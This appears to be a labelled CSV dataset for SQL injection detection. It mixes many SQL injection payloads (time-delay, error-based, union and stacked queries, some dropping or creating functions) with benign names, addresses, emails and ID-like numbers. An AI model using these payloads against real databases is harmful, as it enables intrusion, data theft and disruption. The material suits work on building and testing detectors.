Query,Label
"-5520"")) as utqk where 7762=7762 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"plaa lloreda, 155",0
"1)) as cusv where 4871=4871 and elt(1210=1210,sleep(5))--",1
1) rlike (select * from (select(sleep(5)))vwyq)#,1
tordera savall,0
"1"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""tgdu""=""tgdu",1
"1%"") and 6969=(select 6969 from pg_sleep(5)) and (""%""=""",1
8702699962501028,0
1'||(select 'awic' where 5227=5227;begin dbms_lock.sleep(5); end--,1
"1"" where 1719=1719 and 7533=7533--",1
massimil,0
"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",1
"1')) as ewyk where 4828=4828 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
"1"") and 6969=(select 6969 from pg_sleep(5)) and (""btht""=""btht",1
"1"") and 3824=benchmark(5000000,md5(0x76555642)) and (""vxec"" like ""vxec",1
-7442) or 3391=7492,1
desolladamen-te,0
laruffa,0
roedel,0
tribaldos,0
45183,0
"1"");if(3831=9321) select 3831 else drop function ybru--",1
89vi3o58,0
37541,0
"1%"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",1
21613516w,0
09341,0
njar,0
1);if(4735=8907) select 4735 else drop function qigo--,1
manquel,0
1')) and (select * from (select(sleep(5)))gcrr)#,1
"c/ san martin s/n,",0
garda,0
noble monteys,0
zaquiel,0
"1'+(select 'feof' where 1966=1966;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))+'",1
48099287p,0
"calle doctor zamenhoff, 107",0
41720,0
53364918l,0
"-7146"" where 6431=6431 or 8548=5549--",1
"1"")));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""mrsl""=""mrsl",1
"calle la orotava, s/n",0
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'lwir' like 'lwir",1
05520,0
tabanera de cerrato,0
"1"" or elt(6272=6272,sleep(5)) and ""hvic"" like ""hvic",1
7993090576542905,0
"1'||(select 'dbxr' where 4014=4014 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
04681808c,0
7062474051769610,0
-1479%' or 5201=3398--,1
limongi diguez,0
7288676162465612,0
santa cruz de la palma,0
"1'||(select 'fmss' from dual where 7025=7025 or 8421=(select count(*) from generate_series(1,5000000)))||'",1
"-1550' in boolean mode) union all select 9777,9777,9777--",1
balitear,0
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",1
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('esma' like 'esma",1
"1')));iif(7889=5114,1,1/0)",1
plante,0
calle puerto de alcolea 185 9-e,0
baggerma,0
escriv,0
38656027l,0
tomono@esteticadayda.az,0
"1%"");select (case when (1898=4705) then 1898 else 1/(select 0) end)--",1
"c/ obispo alonso suarez, 163,",0
"1"" where 2235=2235 union all select null,null,null,null,null--",1
kinderman,0
1' where 2134=2134 rlike (select (case when (3613=2090) then 1 else 0x28 end))--,1
1))) rlike sleep(5)#,1
veguos@schnapps.com.mn,0
schonhals-lackteen@opel-e-flex.af,0
"1%"")));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",1
jolley@decoaching.na,0
3948100340900216,0
"-7686%"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"moreno lopez, 55, 9-e",0
47649,0
"-6733') where 4024=4024 union all select 4024,4024,4024,4024#",1
9667,0
"plaza luis pombo, s/n 9?g",0
bar7ech7r5,0
"purpurania, 79 3?b",0
86943454g,0
-2316'))) or 8519=6010,1
"1"") as ufai where 9673=9673;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
22390,0
1%';select case when 7717=7717 then 1 else null end--,1
atef,0
1%' and 7366=9197#,1
1664,0
"1""))) and sleep(5) and (((""fdvc"" like ""fdvc",1
barcelona,0
"1"") and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
desnudez,0
"1)) as jzzo where 7773=7773 union all select null,null,null,null,null#",1
1) where 7680=7680 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
verite@culturalsanpedrocf.dm,0
altrichter@vilano.cu,0
anda matamalas,0
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('xdui' like 'xdui",1
09230,0
"1'+(select 'cstd' where 9326=9326 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))+'",1
96,0
wilson@autoconstruccion.fi,0
jaaziel,0
gruart ola,0
"1%"" and 9198=9198--",1
43143,0
p05f74a.r,0
1916362826143144,0
"1%'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('%'='",1
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""ctrr""=""ctrr",1
primera 152 11-g,0
"1""));(select * from (select(sleep(5)))srmq) and ((""xeki"" like ""xeki",1
villapalacios,0
1%')) rlike sleep(5)#,1
88341714w,0
suau,0
8671,0
18417,0
jarad,0
me9ieval,0
auleda sez,0
aida 184,0
plza. santa maria 96 8?f,0
"1))) union all select null,null,null,null,null,null,null,null,null,null--",1
58305784w,0
cushing_borges8@sitcpla.qa,0
1'||(select 'omeg' from dual where 4751=4751;select pg_sleep(5))||',1
1));select (case when (6002=9048) then 6002 else 6002*(select 6002 from mysql.db) end)#,1
46841,0
"-1993%"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""%""=""",1
mizerk,0
baos vilarrasa,0
"1"")));select count(*) from generate_series(1,5000000) and (((""wdbg"" like ""wdbg",1
navacepedilla de corneja,0
evangelino,0
1')) or sleep(5) and (('uzhd' like 'uzhd,1
celene,0
"1)(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (4003=4003",1
"josep guix i llado, 89 2-d",0
03150,0
88833808b,0
"palomares, 2 11b",0
"-1606'||(select 'qbaa' where 3967=3967 union all select 3967,3967,3967,3967,3967--",1
caada,0
"1) as drbw where 2380=2380 or 8466=benchmark(5000000,md5(0x694a4745))--",1
chatri1,0
339a.redo,0
19784273h,0
tse,0
1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('sgdj' like 'sgdj,1
chasse,0
1)) as cwyb where 3633=3633;select (case when (3681=5026) then 3681 else 3681*(select 3681 from information_schema.character_sets) end)#,1
dan,0
-2527)) as oqpy where 7468=7468 or 3038=3038,1
atmetll farrer,0
fala,0
2l1o03na,0
"1%"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",1
kazem@cup-id.as,0
chumbiauca,0
spickelm,0
7496121103658289,0
mauer,0
mccaffrie@alcantarapartners.ir,0
"1%"")) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
calle arroyo de los angeles 180,0
19244,0
1%'));select sleep(5) and (('%'=',1
"1""))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""ytju"" like ""ytju",1
samuel.felden@multaspendientes.yu,0
iago,0
54530952e,0
pia rusch,0
"1'qhfy<'"">utwq",1
"1) where 7199=7199 and 8407=(select count(*) from generate_series(1,5000000))--",1
"1'||(select 'dyuw' from dual where 2037=2037;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
palacios de la fe,0
1') and 2006=2006,1
37763,0
survey,0
4887,0
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('sjxp' like 'sjxp",1
ellery,0
"1"") where 2764=2764 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",1
viladecavalls,0
valentik,0
eventual,0
05292,0
delusiva,0
mirambel,0
sau nobrega,0
"1%""));(select * from (select(sleep(5)))acdk)#",1
"-3228"") or (5901=1570)*1570 and (""egdd""=""egdd",1
56876281h,0
pruja lantadilla,0
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))-- zvkh",1
66718383y,0
"-2314%')) union all select 4612,4612--",1
gintaras,0
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)# aetd",1
moriego,0
"1""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""urgd""=""urgd",1
1527409541807001,0
"1"") and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
"c/ bascuana 52, 5-e",0
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""unju""=""unju",1
aldrich,0
8569,0
46704601l,0
lombardo,0
7043,0
trampeador,0
spasojevic-sonkkila@digitalcorp.mn,0
mamp8s30r2a,0
"1%"") and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (""%""=""",1
31819774x,0
42112,0
femke,0
abell lamarca,0
2447862424263500,0
1);select pg_sleep(5) and (1044=1044,1
ysero,0
"1"") as sraw where 1997=1997 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
plza. nuestra seora de los reyes 98,0
26141,0
mariele,0
9036735261224878,0
43746,0
"-4305))) union all select 2401,2401--",1
herreta taul,0
"1""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
arvid,0
sauprobo,0
cyril,0
"1') where 4729=4729;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"c/ afrodita 160, 5?b",0
genestar llufriu,0
tornadizos de vila,0
349,0
sudip,0
04ng3na,0
3796618492569421,0
meza@hosterialasmajadillas.gw,0
ericsson,0
rinconada valentin gonzalez 70,0
9931928425770404,0
winstanley@waterflyesp.hn,0
"1'||(select 'jfxs' from dual where 5485=5485 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
"1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
1);select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
02600,0
7159,0
cervantes,0
"1') as dvoy where 7906=7906 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
09195,0
0433193970984111,0
oskar,0
nodonk@locuraporno.ar,0
basilisa,0
"1') where 7541=7541;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
rafael,0
8ap6l4984,0
1'+(select ksoh where 6339=6339;begin dbms_lock.sleep(5); end)+',1
kukier policastro,0
50136,0
8222689869080007,0
"sierra de la estrella, 86,",0
"-6292) union all select 7499,7499,7499,7499,7499,7499,7499--",1
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",1
1)));select (case when (4636=1108) then 1 else 4636*(select 4636 from master..sysdatabases) end)--,1
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('pwuy'='pwuy",1
1' in boolean mode) rlike (select * from (select(sleep(5)))sgvo)#,1
chapurrar,0
-3496')) or 9323=9323#,1
padiernos,0
"1"") where 1607=1607;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
6048168713695182,0
-2625')) or 3038=3038,1
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""opdl""=""opdl",1
castro de rei,0
-2429%' or 6890=5846,1
25254382z,0
"1"" where 7249=7249 union all select null,null,null,null,null,null,null,null,null,null--",1
backy@legami.tz,0
7133903529620631,0
"1'+(select tdkt where 4535=4535;select benchmark(5000000,md5(0x4c4d6142)))+'",1
levitin,0
seto,0
guell lloret,0
44549,0
"-4637"" where 8354=8354 or 1186=2714--",1
4354c07a,0
robertino,0
allis,0
james,0
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""exgr"" like ""exgr",1
"1') as lrif where 6525=6525 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1
"ventas de retamosa, las",0
"1'||(select 'ghby' from dual where 4854=4854;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
bittman,0
4087914907992137,0
4501987508782909,0
grandia zarzosa,0
50835477a,0
tarjetn,0
tarrs,0
demren,0
reco.cida,0
"zabalbide, 114,",0
"1%' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and '%'='",1
8025245569299513,0
queijo pintat,0
laplat@granadapromueve.cx,0
3927,0
5115,0
02327,0
"pasaje lucero 147,",0
"burguerins, 82,",0
32425777d,0
"ginebrosa, la",0
"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",1
8322438262219801,0
"-8080"") as nlos where 8917=8917 union all select 8917,8917,8917,8917--",1
"1' in boolean mode) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"-5587%') or elt(1032=1032,3623) and ('%'='",1
argimn,0
"-4926"" where 8152=8152 or 4339=5547#",1
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",1
"1"" where 2403=2403 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
-9847%'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('%'=',1
1)));if(3490=4920) select 3490 else drop function hlzt--,1
cunat amenta,0
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
87348482w,0
3128013884204713,0
hotson,0
6o40o41,0
beaule,0
polopos,0
saturnina,0
1%' and sleep(5)#,1
"-7235"") union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",1
9a26re88,0
-5982' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ikuh'='ikuh,1
mercador,0
9218,0
1'));begin user_lock.sleep(5); end--,1
lafayette@vitalhome.hk,0
01246496b,0
"1)) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((9914=9914",1
"1"")) union all select null,null,null,null,null,null,null,null--",1
1' in boolean mode) and (select * from (select(sleep(5)))fzno)#,1
"1""))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((""dzse""=""dzse",1
adversario,0
boyadgian@campanasextractoras.tv,0
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""arqb"" like ""arqb",1
"1%')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
1)) as smtf where 5829=5829;select (case when (2350=8682) then 2350 else 1/(select 0) end)--,1
johan,0
5596,0
yevtushenko-pegna@corjet.al,0
nalbach0@softwaremasservicio.aero,0
"josep pallch i carola, 199, 4-e",0
"calle santa escolastica, 184",0
giuliani casabella,0
"1') as nexa where 6740=6740;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
iberio,0
colom colldevall,0
madhim,0
"-1390%"")) union all select 8930,8930,8930,8930,8930#",1
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('qdsr' like 'qdsr",1
escamoneado,0
1') where 8086=8086 and 1430=7941--,1
mayolas,0
-9355' or 6872=6872 and 'mztk'='mztk,1
alpedrete,0
"plaza de el salvador 91,",0
argeo,0
(select (case when (6783=6783) then 1 else 1/(select 0) end)),1
"calle manuel maria de arjona 80,",0
"1"");begin user_lock.sleep(5); end--",1
apulga*rar,0
bacio bonnin,0
bruna,0
17485,0
1')) as txxn where 7884=7884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1
1');select (case when (4719=8852) then 1 else 4719*(select 4719 from master..sysdatabases) end)--,1
1' in boolean mode) or (select * from (select(sleep(5)))ydpu)#,1
"c/ ulises 17,",0
aposesionar,0
pires arajol,0
"1'+(select sged where 1181=1181 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",1
"1%')) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
0210374082544732,0
64462042b,0
1');select sleep(5)#,1
"1')) as yyja where 4321=4321 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
-3359' order by 1--,1
